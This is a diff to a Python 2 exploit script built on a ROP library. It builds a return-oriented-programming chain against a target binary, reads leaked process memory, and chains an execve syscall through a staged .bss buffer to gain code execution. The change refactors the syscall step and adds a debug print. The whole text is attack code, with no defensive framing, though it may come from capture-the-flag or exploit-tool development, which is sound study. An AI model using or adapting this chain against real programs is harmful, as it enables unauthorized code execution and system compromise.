@@ -5,6 +5,7 @@ offset = int(sys.argv[2])
 
 rop = ROP(fpath)
 addr_stage = rop.section('.bss') + 0x400
+nr_execve = 59
 
 buf = rop.fill(offset)
 buf += rop.call_chain_plt(
@@ -25,8 +26,10 @@ buf += rop.fill(400, buf)
 
 p.write(buf)
 data = p.read(0x200000)
+print "[+] len(data) = %x" % len(data)
+ropblob = rop.derive(data, base=ref_addr)
 
-buf = rop.dynamic_syscall(ref_addr, data, 59, addr_stage-112, addr_stage-128, 0)
+buf = ropblob.syscall(nr_execve, addr_stage-112, addr_stage-128, 0)
 print "[+] offset to argv: %d" % (len(buf)-200)
 buf += p64(addr_stage-112)
 buf += p64(0)
